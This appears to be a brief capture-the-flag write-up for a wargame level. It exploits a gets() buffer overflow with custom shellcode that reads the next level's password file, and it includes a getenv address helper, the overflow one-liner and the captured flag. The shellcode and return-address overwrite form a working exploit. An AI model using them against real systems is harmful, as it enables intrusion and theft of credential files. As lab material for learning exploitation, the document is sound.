unprotected gets with an overflow on ret (eip save) at 156+
ptrace checks for use of exec() so we have to use a shellcode without it

this shellcode will open read and write from the provided path

export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'

getenv.c:

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    printf("%p\n", getenv("SHELLCODE"));
}

gcc -m32 getenv.c
./a.out
0xffffd87a

python -c "print 156 * 'a' + '\xff\xff\xd8\x7a'[::-1]" | ./level04
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
